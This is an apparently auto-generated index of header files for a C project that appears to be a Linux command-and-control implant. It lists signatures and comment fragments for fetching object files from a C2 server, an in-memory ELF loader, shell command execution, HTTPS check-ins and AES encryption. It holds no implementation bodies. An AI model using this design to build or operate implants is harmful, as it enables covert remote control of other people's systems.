**File Doc:** *ifndef _AES_H_ define _AES_H_  include <stdint.h> include <stddef.h>  #define the macros below to 1/0 to enable/disable the mode of operation. ifndef CBC define CBC 1 endif ifndef ECB define ECB 1 endif ifndef CTR define CTR 1 endif  define AES256 1  // ✅ Clave de 256 bits  define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only  if defined(AES256) && (AES256 == 1) define AES_KEYLEN 32 define AES_keyExpSize 240 elif defined(AES192) && (AES192 == 1) define AES_KEYLEN 24 define AES_keyExpSize 208 else define AES_KEYLEN 16   // Key length in bytes define AES_keyExpSize 176*

**Imported by:** `aes.c`, `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`

**Functions:**
- `AES_init_ctx` (line 40) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);`
- `AES_init_ctx_iv` (line 43) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);` - *if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))*
- `AES_ctx_set_iv` (line 44) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);`
- `AES_ECB_encrypt` (line 48) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);` - *if defined(ECB) && (ECB == 1)*
- `AES_ECB_decrypt` (line 49) `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);`
- `AES_CBC_encrypt_buffer` (line 53) `void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);` - *if defined(CBC) && (CBC == 1)*
- `AES_CBC_decrypt_buffer` (line 54) `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);`
- `AES_CTR_xcrypt_buffer` (line 58) `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);` - *if defined(CTR) && (CTR == 1)*

**Macros:**
- `_AES_H_` (line 2) `#define _AES_H_`
- `CBC` (line 9) `#define CBC`
- `ECB` (line 12) `#define ECB`
- `CTR` (line 15) `#define CTR`
- `AES256` (line 17) `#define AES256`
- `AES_BLOCKLEN` (line 19) `#define AES_BLOCKLEN`
- `AES_KEYLEN` (line 23) `#define AES_KEYLEN`
- `AES_keyExpSize` (line 24) `#define AES_keyExpSize`
- `AES_KEYLEN` (line 26) `#define AES_KEYLEN`
- `AES_keyExpSize` (line 27) `#define AES_keyExpSize`
- `AES_KEYLEN` (line 29) `#define AES_KEYLEN`
- `AES_keyExpSize` (line 30) `#define AES_keyExpSize`

**Structs:**
- `AES_ctx` (line 33)

#### `beacon.h`
**Path:** `beacon.h`
**File Doc:** *beacon_api.h ifndef BEACON_API_H define BEACON_API_H  include <stdint.h> include <stdarg.h>  Tipos de callback define CALLBACK_OUTPUT 0x00 define CALLBACK_ERROR  0x0D define CALLBACK_OUTPUT_OEM 0x0E  Estructura para parsing de datos (opcional, para comandos complejos)*

**Imported by:** `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`, `gopher_beacon.c`

**Functions:**
- `BeaconDataParse` (line 21) `void BeaconDataParse(datap *parser, char *buffer, int size);` - *=== API para BOFs ===*
- `BeaconDataPtr` (line 22) `char *BeaconDataPtr(datap *parser, int size);`
- `BeaconDataInt` (line 23) `int BeaconDataInt(datap *parser);`
- `BeaconDataShort` (line 24) `short BeaconDataShort(datap *parser);`
- `BeaconDataLength` (line 25) `int BeaconDataLength(datap *parser);`
- `BeaconDataExtract` (line 26) `char *BeaconDataExtract(datap *parser, int *size);`
- `BeaconPrintf` (line 27) `void BeaconPrintf(int type, const char *fmt, ...);`
- `BeaconOutput` (line 28) `void BeaconOutput(int type, const char *data, int len);`

**Macros:**
- `BEACON_API_H` (line 3) `#define BEACON_API_H`
- `CALLBACK_OUTPUT` (line 9) `#define CALLBACK_OUTPUT`
- `CALLBACK_ERROR` (line 10) `#define CALLBACK_ERROR`
- `CALLBACK_OUTPUT_OEM` (line 11) `#define CALLBACK_OUTPUT_OEM`

**Structs:**
- `datap` (line 14) - *Estructura para parsing de datos (opcional, para comandos complejos)*

#### `beacon_api.h`
**Path:** `bof/include/beacon_api.h`

**Functions:**
- `go` (line 7) `* * BOFs MUST export a function with this exact signature: * * void go(char *args, int alen);`
- `BeaconDataParse` (line 35) `void BeaconDataParse(datap *parser, char *buffer, int size);`
- `BeaconDataPtr` (line 37) `char *BeaconDataPtr(datap *parser, int size);`
- `BeaconDataInt` (line 38) `int BeaconDataInt(datap *parser);`
- `BeaconDataShort` (line 39) `short BeaconDataShort(datap *parser);`
- `BeaconDataLength` (line 40) `int BeaconDataLength(datap *parser);`
- `BeaconDataExtract` (line 41) `char *BeaconDataExtract(datap *parser, int *size);`
- `buffer` (line 44) `* takes a raw byte buffer (len may be 0 for strlen-style strings * but the buffer must still be NUL-terminated). */ void BeaconPrintf(int type, const char *fmt, ...);`
- `BeaconOutput` (line 47) `void BeaconOutput(int type, const char *data, int len);`

**Macros:**
- `BSB_BOF_BEACON_API_H` (line 17) `#define BSB_BOF_BEACON_API_H`
- `CALLBACK_OUTPUT` (line 24) `#define CALLBACK_OUTPUT`
- `CALLBACK_ERROR` (line 25) `#define CALLBACK_ERROR`
- `CALLBACK_OUTPUT_OEM` (line 26) `#define CALLBACK_OUTPUT_OEM`

**Structs:**
- `datap` (line 30) - *Argument parser. BOFs that want to read structured args fill * one of these in via BeaconDataParse then pull fields out.*

#### `syscalls.h`
**Path:** `bof/include/syscalls.h`

**Functions:**
- `syscall0` (line 48) `static inline long syscall0(long n)` - *#define SYS_wait4      61 #define SYS_getuid     102 #define SYS_getgid     104 #define SYS_geteuid    107 #define SYS_getegid    108 #define SYS_getpid     39 #define SYS_getppid    110 #define SYS_getpwnam_r 124 #define SYS_getpwuid_r 168 #define SYS_openat     257 #define SYS_clone      56 /* Special fd value meaning "current working directory". define AT_FDCWD ((long)-100)*
- `syscall1` (line 59) `static inline long syscall1(long n, long a1)`
- `syscall2` (line 70) `static inline long syscall2(long n, long a1, long a2)`
- `syscall3` (line 81) `static inline long syscall3(long n, long a1, long a2, long a3)`
- `syscall4` (line 92) `static inline long syscall4(long n, long a1, long a2, long a3, long a4)`
- `bsf_strlen` (line 106) `static inline size_t bsf_strlen(const char *s)` - *static inline long syscall4(long n, long a1, long a2, long a3, long a4) { long ret; register long r10 __asm__("r10") = a4; __asm__ volatile ( "syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3), "r"(r10) : "rcx", "r11", "memory" ); return ret; } /* strlen - libc is not linked.*
- `bsf_strcmp` (line 113) `static inline int bsf_strcmp(const char *a, const char *b)` - *: "a"(n), "D"(a1), "S"(a2), "d"(a3), "r"(r10) : "rcx", "r11", "memory" ); return ret; } /* strlen - libc is not linked. static inline size_t bsf_strlen(const char *s) { const char *p = s; while (*p) p++; return (size_t)(p - s); } /* strcmp - libc is not linked. Returns 0 on match.*
- `bsf_memcmp` (line 119) `static inline int bsf_memcmp(const void *p1, const void *p2, size_t n)` - */* strlen - libc is not linked. static inline size_t bsf_strlen(const char *s) { const char *p = s; while (*p) p++; return (size_t)(p - s); } /* strcmp - libc is not linked. Returns 0 on match. static inline int bsf_strcmp(const char *a, const char *b) { while (*a && (*a == *b)) { a++; b++; } return *(const unsigned char *)a - *(const unsigned char *)b; } /* memcmp - libc is not linked.*
- `volatile` (line 51) `__asm__ volatile ( "syscall" : "=a"(ret) : "a"(n) : "rcx", "r11", "memory" );`

**Macros:**
- `BSB_BOF_SYSCALLS_H` (line 12) `#define BSB_BOF_SYSCALLS_H`
- `SYS_read` (line 17) `#define SYS_read`
- `SYS_write` (line 18) `#define SYS_write`
- `SYS_open` (line 19) `#define SYS_open`
- `SYS_close` (line 20) `#define SYS_close`
- `SYS_stat` (line 21) `#define SYS_stat`
- `SYS_fstat` (line 22) `#define SYS_fstat`
- `SYS_lseek` (line 23) `#define SYS_lseek`
- `SYS_mmap` (line 24) `#define SYS_mmap`
- `SYS_munmap` (line 25) `#define SYS_munmap`
- `SYS_brk` (line 26) `#define SYS_brk`
- `SYS_ioctl` (line 27) `#define SYS_ioctl`
- `SYS_access` (line 28) `#define SYS_access`
- `SYS_pipe` (line 29) `#define SYS_pipe`
- `SYS_dup2` (line 30) `#define SYS_dup2`
- `SYS_fork` (line 31) `#define SYS_fork`
- `SYS_execve` (line 32) `#define SYS_execve`
- `SYS_exit` (line 33) `#define SYS_exit`
- `SYS_wait4` (line 34) `#define SYS_wait4`
- `SYS_getuid` (line 35) `#define SYS_getuid`
- `SYS_getgid` (line 36) `#define SYS_getgid`
- `SYS_geteuid` (line 37) `#define SYS_geteuid`
- `SYS_getegid` (line 38) `#define SYS_getegid`
- `SYS_getpid` (line 39) `#define SYS_getpid`
- `SYS_getppid` (line 40) `#define SYS_getppid`
- `SYS_getpwnam_r` (line 41) `#define SYS_getpwnam_r`
- `SYS_getpwuid_r` (line 42) `#define SYS_getpwuid_r`
- `SYS_openat` (line 43) `#define SYS_openat`
- `SYS_clone` (line 44) `#define SYS_clone`
- `AT_FDCWD` (line 47) `#define AT_FDCWD`

#### `cJSON.h`
**Path:** `cJSON.h`

**Imported by:** `beacon.c`, `beacon3.c`, `beacon5.c`, `beacon6.c`, `beacon_p2p.c`

**Functions:**
- `void` (line 118) `void (CJSON_CDECL *free_fn)(void *ptr);`
- `sensitive` (line 249) `* case_sensitive determines if object keys are treated case sensitive (1) or case insensitive (0) */ CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_bo`

**Macros:**
- `cJSON__h` (line 24) `#define cJSON__h`
- `__WINDOWS__` (line 32) `#define __WINDOWS__`
- `CJSON_CDECL` (line 43) `#define CJSON_CDECL`
- `CJSON_STDCALL` (line 45) `#define CJSON_STDCALL`
- `CJSON_EXPORT_SYMBOLS` (line 49) `#define CJSON_EXPORT_SYMBOLS`
- `CJSON_PUBLIC` (line 53) `#define CJSON_PUBLIC(type)`
- `CJSON_PUBLIC` (line 55) `#define CJSON_PUBLIC(type)`
- `CJSON_PUBLIC` (line 57) `#define CJSON_PUBLIC(type)`
- `CJSON_CDECL` (line 60) `#define CJSON_CDECL`
- `CJSON_STDCALL` (line 61) `#define CJSON_STDCALL`
- `CJSON_PUBLIC` (line 64) `#define CJSON_PUBLIC(type)`
- `CJSON_PUBLIC` (line 66) `#define CJSON_PUBLIC(type)`
- `CJSON_VERSION_MAJOR` (line 71) `#define CJSON_VERSION_MAJOR`
- `CJSON_VERSION_MINOR` (line 72) `#define CJSON_VERSION_MINOR`
- `CJSON_VERSION_PATCH` (line 73) `#define CJSON_VERSION_PATCH`
- `cJSON_Invalid` (line 78) `#define cJSON_Invalid`
- `cJSON_False` (line 79) `#define cJSON_False`
- `cJSON_True` (line 80) `#define cJSON_True`
- `cJSON_NULL` (line 81) `#define cJSON_NULL`
- `cJSON_Number` (line 82) `#define cJSON_Number`
- `cJSON_String` (line 83) `#define cJSON_String`
- `cJSON_Array` (line 84) `#define cJSON_Array`
- `cJSON_Object` (line 85) `#define cJSON_Object`
- `cJSON_Raw` (line 86) `#define cJSON_Raw`
- `cJSON_IsReference` (line 87) `#define cJSON_IsReference`
- `cJSON_StringIsConst` (line 89) `#define cJSON_StringIsConst`
- `CJSON_NESTING_LIMIT` (line 126) `#define CJSON_NESTING_LIMIT`
- `CJSON_CIRCULAR_LIMIT` (line 132) `#define CJSON_CIRCULAR_LIMIT`
- `cJSON_SetIntValue` (line 270) `#define cJSON_SetIntValue(object, number)`
- `cJSON_SetNumberValue` (line 273) `#define cJSON_SetNumberValue(object, number)`
- `cJSON_SetBoolValue` (line 278) `#define cJSON_SetBoolValue(object, boolValue)`
- `cJSON_ArrayForEach` (line 285) `#define cJSON_ArrayForEach(element, array)`

**Structs:**
- `cJSON` (line 92) - *#define cJSON_Invalid (0) #define cJSON_False  (1 << 0) #define cJSON_True   (1 << 1) #define cJSON_NULL   (1 << 2) #define cJSON_Number (1 << 3) #define cJSON_String (1 << 4) #define cJSON_Array  (1 << 5) #define cJSON_Object (1 << 6) #define cJSON_Raw    (1 << 7) /* raw json #define cJSON_IsReference 256 #define cJSON_StringIsConst 512 /* The cJSON structure:*
- `cJSON_Hooks` (line 114)

**Type_Aliases:**
- `cJSON_bool` (line 120) `typedef int cJSON_bool;`

**Variables:**
- `next` (line 27) `extern "C" { #endif #if !defined(__WINDOWS__) && (defined(WIN32) || defined(WIN64) || defined(_MSC_VER) || defined(_WIN32)) #define __WINDOWS__ #endif #ifdef __WINDOWS__ /* When compiling for windows,` - *ifdef __cplusplus*

#### `aes.h`
**Path:** `include/aes.h`
**File Doc:** *ifndef _AES_H_ define _AES_H_  include <stdint.h> include <stddef.h>  #define the macros below to 1/0 to enable/disable the mode of operation. ifndef CBC define CBC 1 endif ifndef ECB define ECB 1 endif ifndef CTR define CTR 1 endif  define AES256 1  // ✅ Clave de 256 bits  define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only  if defined(AES256) && (AES256 == 1) define AES_KEYLEN 32 define AES_keyExpSize 240 elif defined(AES192) && (AES192 == 1) define AES_KEYLEN 24 define AES_keyExpSize 208 else define AES_KEYLEN 16   // Key length in bytes define AES_keyExpSize 176*

**Functions:**
- `AES_init_ctx` (line 40) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);`
- `AES_init_ctx_iv` (line 43) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);` - *if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))*
- `AES_ctx_set_iv` (line 44) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);`
- `AES_ECB_encrypt` (line 48) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);` - *if defined(ECB) && (ECB == 1)*
- `AES_ECB_decrypt` (line 49) `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);`
- `AES_CBC_encrypt_buffer` (line 53) `void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);` - *if defined(CBC) && (CBC == 1)*
- `AES_CBC_decrypt_buffer` (line 54) `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);`
- `AES_CTR_xcrypt_buffer` (line 58) `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);` - *if defined(CTR) && (CTR == 1)*

**Macros:**
- `_AES_H_` (line 2) `#define _AES_H_`
- `CBC` (line 9) `#define CBC`
- `ECB` (line 12) `#define ECB`
- `CTR` (line 15) `#define CTR`
- `AES256` (line 17) `#define AES256`
- `AES_BLOCKLEN` (line 19) `#define AES_BLOCKLEN`
- `AES_KEYLEN` (line 23) `#define AES_KEYLEN`
- `AES_keyExpSize` (line 24) `#define AES_keyExpSize`
- `AES_KEYLEN` (line 26) `#define AES_KEYLEN`
- `AES_keyExpSize` (line 27) `#define AES_keyExpSize`
- `AES_KEYLEN` (line 29) `#define AES_KEYLEN`
- `AES_keyExpSize` (line 30) `#define AES_keyExpSize`

**Structs:**
- `AES_ctx` (line 33)

#### `aes_cfb.h`
**Path:** `include/aes_cfb.h`

**Functions:**
- `aes256_cfb_encrypt` (line 8) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv, const unsigned char* plaintext, size_t len, int* out_len);` - *include <stddef.h>*
- `aes256_cfb_decrypt` (line 11) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv, const unsigned char* ciphertext, size_t len, int* out_len);`

**Macros:**
- `BSB_AES_CFB_H` (line 5) `#define BSB_AES_CFB_H`

#### `beacon.h`
**Path:** `include/beacon.h`
**File Doc:** *beacon_api.h ifndef BEACON_API_H define BEACON_API_H  include <stdint.h> include <stdarg.h>  Tipos de callback define CALLBACK_OUTPUT 0x00 define CALLBACK_ERROR  0x0D define CALLBACK_OUTPUT_OEM 0x0E  Estructura para parsing de datos (opcional, para comandos complejos)*

**Functions:**
- `BeaconDataParse` (line 21) `void BeaconDataParse(datap *parser, char *buffer, int size);` - *=== API para BOFs ===*
- `BeaconDataPtr` (line 22) `char *BeaconDataPtr(datap *parser, int size);`
- `BeaconDataInt` (line 23) `int BeaconDataInt(datap *parser);`
- `BeaconDataShort` (line 24) `short BeaconDataShort(datap *parser);`
- `BeaconDataLength` (line 25) `int BeaconDataLength(datap *parser);`
- `BeaconDataExtract` (line 26) `char *BeaconDataExtract(datap *parser, int *size);`
- `BeaconPrintf` (line 27) `void BeaconPrintf(int type, const char *fmt, ...);`
- `BeaconOutput` (line 28) `void BeaconOutput(int type, const char *data, int len);`

**Macros:**
- `BEACON_API_H` (line 3) `#define BEACON_API_H`
- `CALLBACK_OUTPUT` (line 9) `#define CALLBACK_OUTPUT`
- `CALLBACK_ERROR` (line 10) `#define CALLBACK_ERROR`
- `CALLBACK_OUTPUT_OEM` (line 11) `#define CALLBACK_OUTPUT_OEM`

**Structs:**
- `datap` (line 14) - *Estructura para parsing de datos (opcional, para comandos complejos)*

#### `beacon_common.h`
**Path:** `include/beacon_common.h`

**Functions:**
- `void` (line 45) `typedef void (*bof_func_t)(char*, int);` - *broken full+8 pointer trick that leaked memory. typedef struct { char    *data;      /* response body (malloc'd, caller frees) size_t   len;       /* body length in bytes int      status;    /* HTTP status code (0 on error) } http_response_t; /* --- Trampoline (for position-independent BOF relocations) --- typedef struct { void    *addr; size_t   size; } Trampoline; /* --- BOF function signature ---*
- `bsb_output_init` (line 93) `int bsb_output_init(size_t capacity);` - *Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure.*
- `bsb_output_cleanup` (line 96) `void bsb_output_cleanup(void);` - *Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure. int bsb_output_init(size_t capacity); /* Free the output buffer. Call at beacon shutdown.*
- `bsb_output_reset` (line 99) `void bsb_output_reset(void);` - *Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure. int bsb_output_init(size_t capacity); /* Free the output buffer. Call at beacon shutdown. void bsb_output_cleanup(void); /* Reset the output buffer for a new BOF execution.*
- `BeaconPrintf` (line 102) `void BeaconPrintf(int type, const char *fmt, ...);` - *Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure. int bsb_output_init(size_t capacity); /* Free the output buffer. Call at beacon shutdown. void bsb_output_cleanup(void); /* Reset the output buffer for a new BOF execution. void bsb_output_reset(void); /* Beacon API: printf-style output capture (called by BOFs).*
- `BeaconOutput` (line 105) `void BeaconOutput(int type, const char *data, int len);` - *Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure. int bsb_output_init(size_t capacity); /* Free the output buffer. Call at beacon shutdown. void bsb_output_cleanup(void); /* Reset the output buffer for a new BOF execution. void bsb_output_reset(void); /* Beacon API: printf-style output capture (called by BOFs). void BeaconPrintf(int type, const char *fmt, ...); /* Beacon API: raw output capture (called by BOFs).*
- `create_trampoline` (line 108) `void *create_trampoline(void *target);` - */* Free the output buffer. Call at beacon shutdown. void bsb_output_cleanup(void); /* Reset the output buffer for a new BOF execution. void bsb_output_reset(void); /* Beacon API: printf-style output capture (called by BOFs). void BeaconPrintf(int type, const char *fmt, ...); /* Beacon API: raw output capture (called by BOFs). void BeaconOutput(int type, const char *data, int len); /* Trampoline management*
- `cleanup_trampolines` (line 109) `void cleanup_trampolines(void);`
- `get_or_create_trampoline` (line 110) `void *get_or_create_trampoline(void *target);`
- `https_request` (line 116) `http_response_t https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data);` - *HTTP client: performs GET or POST request. Returns a struct with the response body, length, and status code. On error, data is NULL and len is 0. The caller must free(data). * Uses config for timeouts, TLS verification, and user-agent.*
- `base64_encode` (line 122) `char *base64_encode(const unsigned char *input, int len);` - *HTTP client: performs GET or POST request. Returns a struct with the response body, length, and status code. On error, data is NULL and len is 0. The caller must free(data). * Uses config for timeouts, TLS verification, and user-agent. http_response_t https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data); /* Base64 encode/decode (OpenSSL BIO-based)*
- `base64_decode` (line 123) `unsigned char *base64_decode(const char *input, int *len);`
- `url_encode` (line 126) `char *url_encode(const char *in, size_t in_len, size_t *out_len);` - *HTTP client: performs GET or POST request. Returns a struct with the response body, length, and status code. On error, data is NULL and len is 0. The caller must free(data). * Uses config for timeouts, TLS verification, and user-agent. http_response_t https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data); /* Base64 encode/decode (OpenSSL BIO-based) char           *base64_encode(const unsigned char *input, int len); unsigned char  *base64_decode(const char *input, int *len); /* URL percent-encoding (RFC 3986 unreserved set)*
- `aes256_cfb_encrypt` (line 129) `unsigned char *aes256_cfb_encrypt(const unsigned char *key, const unsigned char *iv, const unsigned char *plaintext, size_t len, int *out_len);` - *Uses config for timeouts, TLS verification, and user-agent. http_response_t https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data); /* Base64 encode/decode (OpenSSL BIO-based) char           *base64_encode(const unsigned char *input, int len); unsigned char  *base64_decode(const char *input, int *len); /* URL percent-encoding (RFC 3986 unreserved set) char *url_encode(const char *in, size_t in_len, size_t *out_len); /* AES-256-CFB encrypt/decrypt (standalone, no OpenSSL dependency)*
- `aes256_cfb_decrypt` (line 133) `unsigned char *aes256_cfb_decrypt(const unsigned char *key, const unsigned char *iv, const unsigned char *ciphertext, size_t len, int *out_len);`
- `buffer` (line 139) `* buffer (caller frees). On error, returns NULL. */ char *exec_cmd(const char *cmd, int *out_len);`
- `RunELF` (line 147) `int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize, unsigned char *argumentdata, int argumentSize);` - *ELF BOF loader. Loads a position-independent ELF object into memory, resolves symbols, applies relocations, and calls the entry function in a forked child process for crash isolation. Returns 0 on success, -1 on error. BOF output is captured * into g_beacon_output.*
- `download_bof` (line 155) `unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size);` - *Download a BOF from the C2 server. Returns malloc'd buffer * (caller frees). On error, sets *out_size to 0 and returns NULL.*
- `run_bof_and_capture` (line 161) `char *run_bof_and_capture(unsigned char *elf_data, uint32_t filesize, char *args, int arglen, int *out_len);` - *Execute a BOF and capture its output. Returns malloc'd string * (caller frees). On error or empty output, returns strdup("").*
- `get_local_ips` (line 169) `char *get_local_ips(void);` - *Get local IP addresses as a comma-separated string. Returns * malloc'd buffer (caller frees). Falls back to "127.0.0.1".*
- `bsb_backoff_init` (line 178) `void bsb_backoff_init(bsb_backoff_t *bo, int base, int max);`
- `bsb_backoff_next` (line 180) `int bsb_backoff_next(bsb_backoff_t *bo);`
- `bsb_backoff_reset` (line 181) `void bsb_backoff_reset(bsb_backoff_t *bo);`

**Macros:**
- `BEACON_COMMON_H` (line 13) `#define BEACON_COMMON_H`
- `_GNU_SOURCE` (line 14) `#define _GNU_SOURCE`
- `BSB_OUTPUT_BUFFER_DEFAULT` (line 26) `#define BSB_OUTPUT_BUFFER_DEFAULT`
- `BSB_OUTPUT_TRUNCATION_MARKER` (line 27) `#define BSB_OUTPUT_TRUNCATION_MARKER`

**Structs:**
- `http_response_t` (line 32) - *-- HTTP response wrapper --- https_request now returns a proper struct instead of the * broken full+8 pointer trick that leaked memory.*
- `Trampoline` (line 39) - *-- HTTP response wrapper --- https_request now returns a proper struct instead of the * broken full+8 pointer trick that leaked memory. typedef struct { char    *data;      /* response body (malloc'd, caller frees) size_t   len;       /* body length in bytes int      status;    /* HTTP status code (0 on error) } http_response_t; /* --- Trampoline (for position-independent BOF relocations) ---*
- `SymbolResolver` (line 48) - *size_t   len;       /* body length in bytes int      status;    /* HTTP status code (0 on error) } http_response_t; /* --- Trampoline (for position-independent BOF relocations) --- typedef struct { void    *addr; size_t   size; } Trampoline; /* --- BOF function signature --- typedef void (*bof_func_t)(char*, int); /* --- Symbol resolver table entry ---*
- `TrampolineCache` (line 54) - *void    *addr; size_t   size; } Trampoline; /* --- BOF function signature --- typedef void (*bof_func_t)(char*, int); /* --- Symbol resolver table entry --- typedef struct { const char  *name; void       **ptr; } SymbolResolver; /* --- Trampoline cache entry ---*
- `bsb_backoff_t` (line 173) - *Exponential backoff state. Initialize once, call bsb_backoff_next() * to get the next sleep duration. Automatically resets on success.*

**Variables:**
- `g_beacon_output` (line 60) `extern char *g_beacon_output;` - */* --- Symbol resolver table entry --- typedef struct { const char  *name; void       **ptr; } SymbolResolver; /* --- Trampoline cache entry --- typedef struct { void    *original; void    *trampoline; } TrampolineCache; /* --- Global state (defined in beacon_common.c) ---*
- `g_output_len` (line 61) `extern size_t g_output_len;`
- `g_output_capacity` (line 62) `extern size_t g_output_capacity;`
- `g_printf_ptr` (line 65) `extern void *g_printf_ptr;` - *} SymbolResolver; /* --- Trampoline cache entry --- typedef struct { void    *original; void    *trampoline; } TrampolineCache; /* --- Global state (defined in beacon_common.c) --- extern char    *g_beacon_output; extern size_t   g_output_len; extern size_t   g_output_capacity; /* Function pointers exposed to BOFs*
- `g_strlen_ptr` (line 66) `extern void *g_strlen_ptr;`
- `g_memcpy_ptr` (line 67) `extern void *g_memcpy_ptr;`
- `g_memset_ptr` (line 68) `extern void *g_memset_ptr;`
- `g_exit_ptr` (line 69) `extern void *g_exit_ptr;`
- `g_dlsym_ptr` (line 70) `extern void *g_dlsym_ptr;`
- `g_dlerror_ptr` (line 71) `extern void *g_dlerror_ptr;`
- `g_dlopen_ptr` (line 72) `extern void *g_dlopen_ptr;`
- `g_dlclose_ptr` (line 73) `extern void *g_dlclose_ptr;`
- `g_write_ptr` (line 74) `extern void *g_write_ptr;`
- `g_mmap_ptr` (line 75) `extern void *g_mmap_ptr;`
- `g_munmap_ptr` (line 76) `extern void *g_munmap_ptr;`
- `g_BeaconPrintf_ptr` (line 77) `extern void *g_BeaconPrintf_ptr;`
- `g_BeaconOutput_ptr` (line 78) `extern void *g_BeaconOutput_ptr;`
- `g_socket_ptr` (line 79) `extern void *g_socket_ptr;`
- `g_connect_ptr` (line 80) `extern void *g_connect_ptr;`
- `g_inet_addr_ptr` (line 81) `extern void *g_inet_addr_ptr;`
- `g_htons_ptr` (line 82) `extern void *g_htons_ptr;`
- `g_send_ptr` (line 83) `extern void *g_send_ptr;`
- `g_recv_ptr` (line 84) `extern void *g_recv_ptr;`
- `g_close_ptr` (line 85) `extern void *g_close_ptr;`
- `g_getaddrinfo_ptr` (line 86) `extern void *g_getaddrinfo_ptr;`
- `g_freeaddrinfo_ptr` (line 87) `extern void *g_freeaddrinfo_ptr;`

#### `cJSON.h`
**Path:** `include/cJSON.h`

**Functions:**
- `void` (line 118) `void (CJSON_CDECL *free_fn)(void *ptr);`
- `sensitive` (line 249) `* case_sensitive determines if object keys are treated case sensitive (1) or case insensitive (0) */ CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_bo`

**Macros:**
- `cJSON__h` (line 24) `#define cJSON__h`
- `__WINDOWS__` (line 32) `#define __WINDOWS__`
- `CJSON_CDECL` (line 43) `#define CJSON_CDECL`
- `CJSON_STDCALL` (line 45) `#define CJSON_STDCALL`
- `CJSON_EXPORT_SYMBOLS` (line 49) `#define CJSON_EXPORT_SYMBOLS`
- `CJSON_PUBLIC` (line 53) `#define CJSON_PUBLIC(type)`
- `CJSON_PUBLIC` (line 55) `#define CJSON_PUBLIC(type)`
- `CJSON_PUBLIC` (line 57) `#define CJSON_PUBLIC(type)`
- `CJSON_CDECL` (line 60) `#define CJSON_CDECL`
- `CJSON_STDCALL` (line 61) `#define CJSON_STDCALL`
- `CJSON_PUBLIC` (line 64) `#define CJSON_PUBLIC(type)`
- `CJSON_PUBLIC` (line 66) `#define CJSON_PUBLIC(type)`
- `CJSON_VERSION_MAJOR` (line 71) `#define CJSON_VERSION_MAJOR`
- `CJSON_VERSION_MINOR` (line 72) `#define CJSON_VERSION_MINOR`
- `CJSON_VERSION_PATCH` (line 73) `#define CJSON_VERSION_PATCH`
- `cJSON_Invalid` (line 78) `#define cJSON_Invalid`
- `cJSON_False` (line 79) `#define cJSON_False`
- `cJSON_True` (line 80) `#define cJSON_True`
- `cJSON_NULL` (line 81) `#define cJSON_NULL`
- `cJSON_Number` (line 82) `#define cJSON_Number`
- `cJSON_String` (line 83) `#define cJSON_String`
- `cJSON_Array` (line 84) `#define cJSON_Array`
- `cJSON_Object` (line 85) `#define cJSON_Object`
- `cJSON_Raw` (line 86) `#define cJSON_Raw`
- `cJSON_IsReference` (line 87) `#define cJSON_IsReference`
- `cJSON_StringIsConst` (line 89) `#define cJSON_StringIsConst`
- `CJSON_NESTING_LIMIT` (line 126) `#define CJSON_NESTING_LIMIT`
- `CJSON_CIRCULAR_LIMIT` (line 132) `#define CJSON_CIRCULAR_LIMIT`
- `cJSON_SetIntValue` (line 270) `#define cJSON_SetIntValue(object, number)`
- `cJSON_SetNumberValue` (line 273) `#define cJSON_SetNumberValue(object, number)`
- `cJSON_SetBoolValue` (line 278) `#define cJSON_SetBoolValue(object, boolValue)`
- `cJSON_ArrayForEach` (line 285) `#define cJSON_ArrayForEach(element, array)`

**Structs:**
- `cJSON` (line 92) - *#define cJSON_Invalid (0) #define cJSON_False  (1 << 0) #define cJSON_True   (1 << 1) #define cJSON_NULL   (1 << 2) #define cJSON_Number (1 << 3) #define cJSON_String (1 << 4) #define cJSON_Array  (1 << 5) #define cJSON_Object (1 << 6) #define cJSON_Raw    (1 << 7) /* raw json #define cJSON_IsReference 256 #define cJSON_StringIsConst 512 /* The cJSON structure:*
- `cJSON_Hooks` (line 114)

**Type_Aliases:**
- `cJSON_bool` (line 120) `typedef int cJSON_bool;`

**Variables:**
